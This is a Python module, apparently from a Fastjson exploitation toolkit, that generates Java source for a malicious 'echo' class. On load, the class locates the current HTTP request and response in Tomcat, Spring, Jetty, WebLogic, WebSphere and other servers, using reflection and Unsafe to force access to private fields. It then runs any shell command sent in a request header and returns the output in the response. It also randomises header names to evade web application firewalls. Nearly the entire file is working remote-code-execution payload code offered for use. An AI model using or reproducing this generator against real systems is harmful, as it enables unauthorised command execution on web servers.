"""生成命令回显恶意类 Java 源码。

技术路线参考 pen4uin/java-echo-generator（各中间件挖 Request/Response），
并保留本仓库 CVE-2026-16723 中的 JDK12+ Unsafe setAccessible / Field 写入兼容。
"""

from __future__ import annotations

import random
import string
from typing import Optional

from fastjson_toolkit.poc.echo.engines import EchoEngine, normalize_engine

DEFAULT_CMD_HEADER = "X-Cmd"
DEFAULT_CLASS_NAME = "EchoPayload"


def java_string_literal(s: str) -> str:
    return (
        s.replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\r", "\\r")
        .replace("\n", "\\n")
    )


def gen_cmd_header(prefix: str = "X-Cmd") -> str:
    """生成较不易被 WAF 误伤的命令头名（可选随机后缀）。"""
    suffix = "".join(random.choices(string.ascii_letters, k=4))
    base = (prefix or DEFAULT_CMD_HEADER).strip() or DEFAULT_CMD_HEADER
    if "-" in base:
        return f"{base}-{suffix}"
    return f"{base}-{suffix}"


def build_echo_java_source(
    *,
    class_name: str = DEFAULT_CLASS_NAME,
    engine: str = "auto",
    cmd_header: str = DEFAULT_CMD_HEADER,
    default_cmd: str = "id",
    proof_path: Optional[str] = None,
    banner: str = "FJ-ECHO",
    package: Optional[str] = None,
    extra_imports: Optional[list[str]] = None,
    class_annotations: Optional[list[str]] = None,
    implements: Optional[list[str]] = None,
    extra_class_body: str = "",
    trigger_static: bool = True,
) -> str:
    """生成「加载/实例化即回显」的 Java 源码（无第三方依赖，全反射）。"""
    eng = normalize_engine(engine)
    cname = (class_name or DEFAULT_CLASS_NAME).strip() or DEFAULT_CLASS_NAME
    if not cname.isidentifier():
        raise ValueError(f"非法 Java 类名: {cname!r}")

    header_lit = java_string_literal(cmd_header or DEFAULT_CMD_HEADER)
    engine_lit = java_string_literal(eng)
    default_cmd_lit = java_string_literal(default_cmd or "id")
    banner_lit = java_string_literal(banner or "FJ-ECHO")
    proof_lit = java_string_literal(proof_path) if proof_path else None

    pkg = f"package {package};\n\n" if package else ""
    imports = [
        "import java.io.ByteArrayOutputStream;",
        "import java.io.InputStream;",
        "import java.io.PrintWriter;",
        "import java.lang.reflect.AccessibleObject;",
        "import java.lang.reflect.Array;",
        "import java.lang.reflect.Field;",
        "import java.lang.reflect.Method;",
        "import java.nio.charset.StandardCharsets;",
        "import java.util.ArrayList;",
        "import java.util.Base64;",
        "import java.util.HashSet;",
        "import java.util.Map;",
    ]
    if proof_path:
        imports.extend(
            [
                "import java.nio.file.Files;",
                "import java.nio.file.Paths;",
            ]
        )
    for item in extra_imports or []:
        line = item if item.strip().startswith("import ") else f"import {item};"
        if line not in imports:
            imports.append(line)
    imports_block = "\n".join(imports)

    annos = "\n".join(class_annotations or [])
    if annos:
        annos = annos + "\n"
    impl = ""
    if implements:
        impl = " implements " + ", ".join(implements)

    static_block = ""
    if trigger_static:
        static_block = f"""
    static {{
        try {{
            new {cname}();
        }} catch (Throwable ignore) {{
        }}
    }}
"""

    proof_write = ""
    if proof_lit is not None:
        proof_write = f"""
        try {{
            String body = "{banner_lit}\\n"
                    + "ts=" + System.currentTimeMillis() + "\\n"
                    + "mode=echo\\n"
                    + "engine=" + used + "\\n"
                    + "java=" + System.getProperty("java.version") + "\\n"
                    + "cmd=" + cmd + "\\n"
                    + "name=" + {cname}.class.getName() + "\\n"
                    + "---\\n" + outText;
            Files.write(Paths.get("{proof_lit}"), body.getBytes(StandardCharsets.UTF_8));
        }} catch (Throwable ignore) {{
        }}
"""

    return f"""\
{pkg}{imports_block}

{annos}public class {cname}{impl} {{
{static_block}
    public {cname}() {{
        try {{
            doEcho();
        }} catch (Throwable t) {{
            t.printStackTrace();
        }}
    }}

    private static void doEcho() throws Exception {{
        String engine = "{engine_lit}";
        Object[] pair = null;
        String used = null;

        if ("spring".equals(engine) || "auto".equals(engine)) {{
            pair = fromSpring();
            if (pair != null) used = "spring";
        }}
        if (pair == null && ("undertow".equals(engine) || "auto".equals(engine))) {{
            pair = fromUndertow();
            if (pair != null) used = "undertow";
        }}
        if (pair == null && ("tomcat".equals(engine) || "auto".equals(engine))) {{
            pair = fromTomcat();
            if (pair != null) used = "tomcat";
        }}
        if (pair == null && ("jetty".equals(engine) || "auto".equals(engine))) {{
            pair = fromJetty();
            if (pair != null) used = "jetty";
        }}
        if (pair == null && ("weblogic".equals(engine) || "auto".equals(engine))) {{
            pair = fromWebLogic();
            if (pair != null) used = "weblogic";
        }}
        if (pair == null && ("websphere".equals(engine) || "auto".equals(engine))) {{
            pair = fromWebSphere();
            if (pair != null) used = "websphere";
        }}
        if (pair == null && ("resin".equals(engine) || "auto".equals(engine))) {{
            pair = fromResin();
            if (pair != null) used = "resin";
        }}
        if (pair == null && ("struts2".equals(engine) || "auto".equals(engine))) {{
            pair = fromStruts2();
            if (pair != null) used = "struts2";
        }}
        if (pair == null && ("httpserver".equals(engine) || "auto".equals(engine))) {{
            pair = fromHttpServer();
            if (pair != null) used = "httpserver";
        }}
        if (pair == null && ("dfs".equals(engine) || "auto".equals(engine))) {{
            pair = fromDfs();
            if (pair != null) used = "dfs";
        }}
        if (pair == null) {{
            return;
        }}

        if ("httpserver".equals(used)) {{
            echoHttpServer(pair[0]);
            return;
        }}

        Object request = pair[0];
        Object response = pair[1];
        String cmd = (String) invoke(request, "getHeader", new Class[]{{String.class}}, new Object[]{{"{header_lit}"}});
        if (cmd == null || cmd.length() == 0) {{
            cmd = "{default_cmd_lit}";
        }}

        byte[] outBytes = exec(cmd);
        String outText = new String(outBytes, StandardCharsets.UTF_8);
{proof_write}
        try {{
            invoke(response, "setHeader", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo", Base64.getEncoder().encodeToString(outBytes)}});
            invoke(response, "setHeader", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo-Cmd", cmd.replaceAll("[\\\\r\\\\n]", " ")}});
            invoke(response, "setHeader", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo-Engine", used}});
        }} catch (Throwable ignore) {{
        }}

        try {{
            try {{ invoke(response, "resetBuffer", new Class[0], new Object[0]); }} catch (Throwable ignore) {{}}
            try {{ invoke(response, "setStatus", new Class[]{{int.class}}, new Object[]{{Integer.valueOf(200)}}); }} catch (Throwable ignore) {{}}
            try {{ invoke(response, "setContentType", new Class[]{{String.class}}, new Object[]{{"text/plain;charset=UTF-8"}}); }} catch (Throwable ignore) {{}}
            PrintWriter w = (PrintWriter) invoke(response, "getWriter", new Class[0], new Object[0]);
            w.write(outText);
            w.flush();
            try {{ invoke(response, "flushBuffer", new Class[0], new Object[0]); }} catch (Throwable ignore) {{}}
        }} catch (Throwable ignore) {{
        }}
    }}

    // ---- JDK com.sun.net.httpserver.HttpExchange（本仓库 gadget 靶场） ----
    private static void echoHttpServer(Object exchange) throws Exception {{
        String cmd = "{default_cmd_lit}";
        try {{
            Object reqHeaders = invoke(exchange, "getRequestHeaders", new Class[0], new Object[0]);
            Object v = invoke(reqHeaders, "getFirst", new Class[]{{String.class}}, new Object[]{{"{header_lit}"}});
            if (v != null && String.valueOf(v).length() > 0) {{
                cmd = String.valueOf(v);
            }}
        }} catch (Throwable ignore) {{
        }}
        byte[] outBytes = exec(cmd);
        String outText = new String(outBytes, StandardCharsets.UTF_8);
        try {{
            Object respHeaders = invoke(exchange, "getResponseHeaders", new Class[0], new Object[0]);
            invoke(respHeaders, "set", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo", Base64.getEncoder().encodeToString(outBytes)}});
            invoke(respHeaders, "set", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo-Cmd", cmd.replaceAll("[\\\\r\\\\n]", " ")}});
            invoke(respHeaders, "set", new Class[]{{String.class, String.class}},
                new Object[]{{"X-Echo-Engine", "httpserver"}});
        }} catch (Throwable ignore) {{
        }}
        // 不抢先 sendResponseHeaders：留给业务 handler 写 body，仅靠响应头回显
        try {{
            // 可选：把输出塞进 exchange 属性，便于调试
            invoke(exchange, "setAttribute", new Class[]{{String.class, Object.class}},
                new Object[]{{"X-Echo-Text", outText}});
        }} catch (Throwable ignore) {{
        }}
    }}

    private static Object[] fromHttpServer() {{
        try {{
            // 本仓库 gadget 靶场：GadgetLabServer.CURRENT_EXCHANGE
            try {{
                Class<?> lab = Class.forName("com.fastjsonlab.GadgetLabServer");
                Object tl = lab.getField("CURRENT_EXCHANGE").get(null);
                Object ex = invoke(tl, "get", new Class[0], new Object[0]);
                if (ex != null) {{
                    return new Object[]{{ex, ex}};
                }}
            }} catch (Throwable ignore) {{
            }}
            Object[] box = new Object[1];
            HashSet seen = new HashSet();
            dfsFindHttpExchange(Thread.currentThread(), 0, seen, box);
            if (box[0] != null) {{
                return new Object[]{{box[0], box[0]}};
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    private static void dfsFindHttpExchange(Object o, int depth, HashSet seen, Object[] box) {{
        if (o == null || depth > 52 || box[0] != null) return;
        if (seen.contains(o)) return;
        seen.add(o);
        try {{
            String cn = o.getClass().getName();
            if (cn.contains("HttpExchange")) {{
                box[0] = o;
                return;
            }}
            if (o instanceof Object[]) {{
                Object[] arr = (Object[]) o;
                for (int i = 0; i < arr.length; i++) {{
                    dfsFindHttpExchange(arr[i], depth + 1, seen, box);
                    if (box[0] != null) return;
                }}
            }}
            Class c = o.getClass();
            while (c != null && c != Object.class) {{
                Field[] fields = c.getDeclaredFields();
                for (int i = 0; i < fields.length; i++) {{
                    Field f = fields[i];
                    try {{
                        forceAccess(f);
                        Object v = f.get(o);
                        if (v != null) dfsFindHttpExchange(v, depth + 1, seen, box);
                    }} catch (Throwable ignore) {{
                    }}
                    if (box[0] != null) return;
                }}
                c = c.getSuperclass();
            }}
        }} catch (Throwable ignore) {{
        }}
    }}

    // ---- spring: RequestContextHolder (jEG SpringMVC) ----
    private static Object[] fromSpring() {{
        try {{
            Class<?> holder = Class.forName("org.springframework.web.context.request.RequestContextHolder");
            Object ra = invoke(holder, "getRequestAttributes", new Class[0], new Object[0]);
            if (ra == null) return null;
            Object request = invoke(ra, "getRequest", new Class[0], new Object[0]);
            Object response = invoke(ra, "getResponse", new Class[0], new Object[0]);
            if (request == null || response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    // ---- undertow ----
    private static Object[] fromUndertow() {{
        Object[] pair = fromUndertowCurrent();
        if (pair != null) return pair;
        return fromUndertowThreadLocal();
    }}

    private static Object[] fromUndertowCurrent() {{
        try {{
            Class<?> ctxClz = Class.forName("io.undertow.servlet.handlers.ServletRequestContext");
            Object ctx = invoke(ctxClz, "current", new Class[0], new Object[0]);
            if (ctx == null) return null;
            Object request;
            Object response;
            try {{
                request = invoke(ctx, "getServletRequest", new Class[0], new Object[0]);
                response = invoke(ctx, "getServletResponse", new Class[0], new Object[0]);
            }} catch (Throwable e) {{
                request = getField(ctx, "servletRequest");
                response = getField(ctx, "servletResponse");
            }}
            if (request == null || response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    private static Object[] fromUndertowThreadLocal() {{
        try {{
            Object threadLocals = getField(Thread.currentThread(), "threadLocals");
            if (threadLocals == null) return null;
            Object table = getField(threadLocals, "table");
            if (table == null) return null;
            int len = Array.getLength(table);
            for (int i = 0; i < len; i++) {{
                Object entry = Array.get(table, i);
                if (entry == null) continue;
                Object value = getField(entry, "value");
                if (value == null) continue;
                if (value.getClass().getName().contains("ServletRequestContext")) {{
                    Object request = getField(value, "servletRequest");
                    Object response = getField(value, "servletResponse");
                    if (request != null && response != null) {{
                        return new Object[]{{request, response}};
                    }}
                }}
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    // ---- tomcat: RequestGroupInfo + WRAP_SAME_OBJECT ----
    private static Object[] fromTomcat() {{
        Object[] pair = fromTomcatProcessors();
        if (pair != null) return pair;
        return fromTomcatWrapSameObject();
    }}

    private static Object[] fromTomcatProcessors() {{
        try {{
            Thread[] threads = allThreads();
            for (int i = 0; i < threads.length; i++) {{
                Thread th = threads[i];
                if (th == null || th.getName() == null) continue;
                String name = th.getName();
                if (!(name.contains("http") && name.contains("Acceptor"))) continue;
                Object cur = getField(th, "target");
                if (cur == null) continue;
                try {{ cur = getField(cur, "endpoint"); }} catch (Throwable e) {{ cur = getField(cur, "this$0"); }}
                try {{
                    cur = getField(cur, "handler");
                }} catch (Throwable e1) {{
                    try {{ cur = getField(cur.getClass().getSuperclass(), cur, "handler"); }}
                    catch (Throwable e2) {{ cur = getField(cur.getClass().getSuperclass().getSuperclass(), cur, "handler"); }}
                }}
                try {{ cur = getField(cur, "global"); }}
                catch (Throwable e) {{ cur = getField(cur.getClass().getSuperclass(), cur, "global"); }}
                if (cur == null || !cur.getClass().getName().contains("RequestGroupInfo")) continue;
                ArrayList processors = (ArrayList) getField(cur, "processors");
                if (processors == null) continue;
                for (int j = 0; j < processors.size(); j++) {{
                    Object ri = processors.get(j);
                    Object coyoteReq = getField(ri, "req");
                    if (coyoteReq == null) continue;
                    String hdr;
                    try {{
                        hdr = (String) invoke(coyoteReq, "getHeader", new Class[]{{String.class}}, new Object[]{{"{header_lit}"}});
                    }} catch (Throwable e) {{
                        continue;
                    }}
                    if (hdr == null) continue;
                    Object catalinaReq = invoke(coyoteReq, "getNote", new Class[]{{int.class}}, new Object[]{{Integer.valueOf(1)}});
                    if (catalinaReq == null) continue;
                    Object response = invoke(catalinaReq, "getResponse", new Class[0], new Object[0]);
                    if (response == null) continue;
                    Object request = catalinaReq;
                    try {{
                        Object facade = getField(catalinaReq, "facade");
                        if (facade != null) request = facade;
                    }} catch (Throwable ignore) {{
                    }}
                    return new Object[]{{request, response}};
                }}
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    private static Object[] fromTomcatWrapSameObject() {{
        try {{
            Class<?> ad = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field wrap = ad.getDeclaredField("WRAP_SAME_OBJECT");
            forceAccess(wrap);
            Class<?> afc = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field reqF = afc.getDeclaredField("lastServicedRequest");
            Field respF = afc.getDeclaredField("lastServicedResponse");
            forceAccess(reqF);
            forceAccess(respF);
            boolean wrapOn = wrap.getBoolean(null);
            ThreadLocal reqTL = (ThreadLocal) reqF.get(null);
            ThreadLocal respTL = (ThreadLocal) respF.get(null);
            if (!wrapOn || reqTL == null || respTL == null) {{
                setFieldValue(wrap, null, Boolean.TRUE);
                if (reqTL == null) setFieldValue(reqF, null, new ThreadLocal());
                if (respTL == null) setFieldValue(respF, null, new ThreadLocal());
                return null;
            }}
            Object request = reqTL.get();
            Object response = respTL.get();
            if (request == null || response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    // ---- jetty: ThreadLocal HttpConnection (jEG) ----
    private static Object[] fromJetty() {{
        try {{
            Object threadLocals = getField(Thread.currentThread(), "threadLocals");
            if (threadLocals == null) return null;
            Object table = getField(threadLocals, "table");
            if (table == null) return null;
            int len = Array.getLength(table);
            for (int i = 0; i < len; i++) {{
                Object entry = Array.get(table, i);
                if (entry == null) continue;
                Object value = getField(entry, "value");
                if (value == null) continue;
                String cn = value.getClass().getName();
                if (!(cn.equals("org.eclipse.jetty.server.HttpConnection") || cn.contains("HttpConnection"))) {{
                    continue;
                }}
                Object request;
                Object response;
                try {{
                    Object channel = invoke(value, "getHttpChannel", new Class[0], new Object[0]);
                    request = invoke(channel, "getRequest", new Class[0], new Object[0]);
                    response = invoke(channel, "getResponse", new Class[0], new Object[0]);
                }} catch (Throwable e) {{
                    request = invoke(value, "getRequest", new Class[0], new Object[0]);
                    response = invoke(value, "getResponse", new Class[0], new Object[0]);
                }}
                if (request != null && response != null) {{
                    return new Object[]{{request, response}};
                }}
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    // ---- weblogic ----
    private static Object[] fromWebLogic() {{
        try {{
            Object work = invoke(Thread.currentThread(), "getCurrentWork", new Class[0], new Object[0]);
            if (work == null) return null;
            try {{
                Object response = invoke(work, "getResponse", new Class[0], new Object[0]);
                if (response != null) {{
                    return new Object[]{{work, response}};
                }}
            }} catch (Throwable ignore) {{
            }}
            Object handler = getField(work, "connectionHandler");
            if (handler == null) return null;
            Object request = invoke(handler, "getServletRequest", new Class[0], new Object[0]);
            Object response = invoke(handler, "getServletResponse", new Class[0], new Object[0]);
            if (request == null || response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    // ---- websphere ----
    private static Object[] fromWebSphere() {{
        try {{
            Object arr = getField(Thread.currentThread(), "wsThreadLocals");
            if (!(arr instanceof Object[])) return null;
            Object[] locals = (Object[]) arr;
            for (int i = 0; i < locals.length; i++) {{
                Object o = locals[i];
                if (o == null) continue;
                if (!o.getClass().getName().endsWith("WebContainerRequestState")) continue;
                Object request = invoke(o, "getCurrentThreadsIExtendedRequest", new Class[0], new Object[0]);
                Object response = invoke(o, "getCurrentThreadsIExtendedResponse", new Class[0], new Object[0]);
                if (request != null && response != null) {{
                    return new Object[]{{request, response}};
                }}
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    // ---- resin ----
    private static Object[] fromResin() {{
        try {{
            Class<?> clz = Thread.currentThread().getContextClassLoader()
                .loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object request = invoke(clz, "getContextRequest", new Class[0], new Object[0]);
            if (request == null) return null;
            Object response;
            try {{
                response = getField(request, "_response");
            }} catch (Throwable e) {{
                response = getField(request.getClass().getSuperclass(), request, "_response");
            }}
            if (response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    // ---- struts2 ----
    private static Object[] fromStruts2() {{
        try {{
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            Class<?> ac = Class.forName("com.opensymphony.xwork2.ActionContext", false, loader);
            Field f = ac.getDeclaredField("actionContext");
            forceAccess(f);
            ThreadLocal tl = (ThreadLocal) f.get(null);
            if (tl == null) return null;
            Object con = tl.get();
            if (con == null) return null;
            Object context = invoke(con, "getContext", new Class[0], new Object[0]);
            Object request = invoke(context, "get", new Class[]{{String.class}},
                new Object[]{{"com.opensymphony.xwork2.dispatcher.HttpServletRequest"}});
            Object response = invoke(context, "get", new Class[]{{String.class}},
                new Object[]{{"com.opensymphony.xwork2.dispatcher.HttpServletResponse"}});
            if (request == null || response == null) return null;
            return new Object[]{{request, response}};
        }} catch (Throwable e) {{
            return null;
        }}
    }}

    // ---- dfs: walk object graph (javax + jakarta) ----
    private static Object[] fromDfs() {{
        try {{
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class reqClz = null;
            Class respClz = null;
            String[] reqNames = new String[]{{
                "javax.servlet.http.HttpServletRequest",
                "jakarta.servlet.http.HttpServletRequest"
            }};
            String[] respNames = new String[]{{
                "javax.servlet.http.HttpServletResponse",
                "jakarta.servlet.http.HttpServletResponse"
            }};
            for (int i = 0; i < reqNames.length; i++) {{
                try {{
                    reqClz = cl.loadClass(reqNames[i]);
                    respClz = cl.loadClass(respNames[i]);
                    break;
                }} catch (Throwable ignore) {{
                }}
            }}
            if (reqClz == null || respClz == null) return null;
            Object[] box = new Object[2];
            HashSet seen = new HashSet();
            dfsWalk(Thread.currentThread(), 0, reqClz, respClz, seen, box, "{header_lit}");
            if (box[0] != null && box[1] != null) {{
                return box;
            }}
        }} catch (Throwable ignore) {{
        }}
        return null;
    }}

    private static void dfsWalk(Object o, int depth, Class reqClz, Class respClz,
                                HashSet seen, Object[] box, String hdrName) {{
        if (o == null || depth > 52 || (box[0] != null && box[1] != null)) return;
        if (seen.contains(o)) return;
        seen.add(o);
        try {{
            if (box[0] == null && reqClz.isAssignableFrom(o.getClass())) {{
                String hdr = (String) invoke(o, "getHeader", new Class[]{{String.class}}, new Object[]{{hdrName}});
                if (hdr != null) {{
                    box[0] = o;
                    try {{
                        box[1] = invoke(o, "getResponse", new Class[0], new Object[0]);
                    }} catch (Throwable ignore) {{
                    }}
                }}
            }} else if (box[1] == null && respClz.isAssignableFrom(o.getClass())) {{
                box[1] = o;
            }}
            if (box[0] != null && box[1] != null) return;
            Class c = o.getClass();
            while (c != null && c != Object.class) {{
                Field[] fields = c.getDeclaredFields();
                for (int i = 0; i < fields.length; i++) {{
                    Field f = fields[i];
                    try {{
                        forceAccess(f);
                        Object v = f.get(o);
                        if (v != null) dfsWalk(v, depth + 1, reqClz, respClz, seen, box, hdrName);
                    }} catch (Throwable ignore) {{
                    }}
                    if (box[0] != null && box[1] != null) return;
                }}
                c = c.getSuperclass();
            }}
        }} catch (Throwable ignore) {{
        }}
    }}

    private static Thread[] allThreads() throws Exception {{
        try {{
            Method m = Thread.class.getDeclaredMethod("getThreads");
            forceAccess(m);
            return (Thread[]) m.invoke(null);
        }} catch (Throwable e) {{
            Map map = Thread.getAllStackTraces();
            return (Thread[]) map.keySet().toArray(new Thread[0]);
        }}
    }}

    private static byte[] exec(String cmd) throws Exception {{
        boolean linux = true;
        String os = System.getProperty("os.name");
        if (os != null && os.toLowerCase().contains("win")) linux = false;
        String[] cmds = linux
            ? new String[]{{"/bin/sh", "-c", cmd}}
            : new String[]{{"cmd.exe", "/c", cmd}};
        Process p = Runtime.getRuntime().exec(cmds);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        copyStream(p.getInputStream(), bos);
        copyStream(p.getErrorStream(), bos);
        p.waitFor();
        return bos.toByteArray();
    }}

    private static Object getUnsafe() throws Exception {{
        Class<?> unsafeClz = Class.forName("sun.misc.Unsafe");
        Field f = unsafeClz.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        return f.get(null);
    }}

    private static void forceAccess(AccessibleObject ao) throws Exception {{
        try {{
            ao.setAccessible(true);
            return;
        }} catch (Throwable ignore) {{
        }}
        Object unsafe = getUnsafe();
        Field override = AccessibleObject.class.getDeclaredField("override");
        long off = ((Long) unsafe.getClass().getMethod("objectFieldOffset", Field.class)
            .invoke(unsafe, override)).longValue();
        unsafe.getClass().getMethod("putBoolean", Object.class, long.class, boolean.class)
            .invoke(unsafe, ao, Long.valueOf(off), Boolean.TRUE);
    }}

    private static void setFieldValue(Field field, Object obj, Object value) throws Exception {{
        forceAccess(field);
        try {{
            field.set(obj, value);
            return;
        }} catch (Throwable ignore) {{
        }}
        Object unsafe = getUnsafe();
        Class<?> uc = unsafe.getClass();
        Object base;
        long off;
        if (obj == null) {{
            base = uc.getMethod("staticFieldBase", Field.class).invoke(unsafe, field);
            off = ((Long) uc.getMethod("staticFieldOffset", Field.class).invoke(unsafe, field)).longValue();
        }} else {{
            base = obj;
            off = ((Long) uc.getMethod("objectFieldOffset", Field.class).invoke(unsafe, field)).longValue();
        }}
        Class<?> ft = field.getType();
        if (ft == boolean.class) {{
            uc.getMethod("putBoolean", Object.class, long.class, boolean.class)
                .invoke(unsafe, base, Long.valueOf(off), (Boolean) value);
        }} else {{
            uc.getMethod("putObject", Object.class, long.class, Object.class)
                .invoke(unsafe, base, Long.valueOf(off), value);
        }}
    }}

    private static Object getField(Object o, String name) throws Exception {{
        return getField(o.getClass(), o, name);
    }}

    private static Object getField(Class<?> clazz, Object o, String name) throws Exception {{
        Class<?> c = clazz;
        while (c != null && c != Object.class) {{
            try {{
                Field f = c.getDeclaredField(name);
                forceAccess(f);
                return f.get(o);
            }} catch (NoSuchFieldException e) {{
                c = c.getSuperclass();
            }}
        }}
        throw new NoSuchFieldException(name);
    }}

    private static Object invoke(Object obj, String methodName, Class[] types, Object[] args) throws Exception {{
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Class<?> c = clazz;
        Method method = null;
        while (c != null && method == null) {{
            try {{ method = c.getDeclaredMethod(methodName, types); }}
            catch (NoSuchMethodException e) {{ c = c.getSuperclass(); }}
        }}
        if (method == null) {{
            c = clazz;
            while (c != null && method == null) {{
                try {{ method = c.getMethod(methodName, types); }}
                catch (NoSuchMethodException e) {{ c = c.getSuperclass(); }}
            }}
        }}
        if (method == null) throw new NoSuchMethodException(methodName);
        forceAccess(method);
        if (obj instanceof Class) return method.invoke(null, args);
        return method.invoke(obj, args);
    }}

    private static void copyStream(InputStream in, ByteArrayOutputStream out) throws Exception {{
        if (in == null) return;
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        try {{ in.close(); }} catch (Throwable ignore) {{}}
    }}
{extra_class_body}
}}
"""
